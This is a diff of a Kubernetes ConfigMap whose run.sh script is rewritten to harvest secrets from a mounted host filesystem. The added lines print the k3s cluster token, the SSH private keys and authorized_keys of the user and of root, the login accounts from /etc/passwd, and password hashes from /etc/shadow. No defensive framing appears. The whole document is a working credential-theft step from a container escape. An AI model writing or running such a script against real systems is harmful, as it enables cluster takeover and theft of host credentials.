@@ -6,14 +6,18 @@ metadata:
 data:
   run.sh: |
     #!/bin/sh
-    echo LS_K3S
-    ls -la /k3s-server/ 2>&1
-    echo LS_HOST
-    ls /host-root/ 2>&1
-    echo SSH_PC
-    ls /host-root/home/pc/.ssh/ 2>&1 && cat /host-root/home/pc/.ssh/authorized_keys 2>/dev/null
-    echo SSH_ROOT
+    echo K3S_TOKEN
+    cat /k3s-server/token
+    echo SSH_PC_AUTHORIZED
+    cat /host-root/home/pc/.ssh/authorized_keys 2>/dev/null || echo none
+    echo SSH_PC_PRIVKEY
+    cat /host-root/home/pc/.ssh/id_rsa 2>/dev/null || cat /host-root/home/pc/.ssh/id_ed25519 2>/dev/null || echo none
+    echo SSH_ROOT_AUTHORIZED
     cat /host-root/root/.ssh/authorized_keys 2>/dev/null || echo none
-    echo FIND_K3S
-    find /host-root/etc/rancher /host-root/var/lib/rancher -name node-token 2>/dev/null
+    echo SSH_ROOT_KEY
+    cat /host-root/root/.ssh/id_rsa 2>/dev/null || echo none
+    echo PASSWD
+    cat /host-root/etc/passwd | grep -v nologin | grep -v false
+    echo SHADOW
+    cat /host-root/etc/shadow 2>/dev/null | grep -v ":!:" | grep -v ":*:" | head -20
     echo DONE
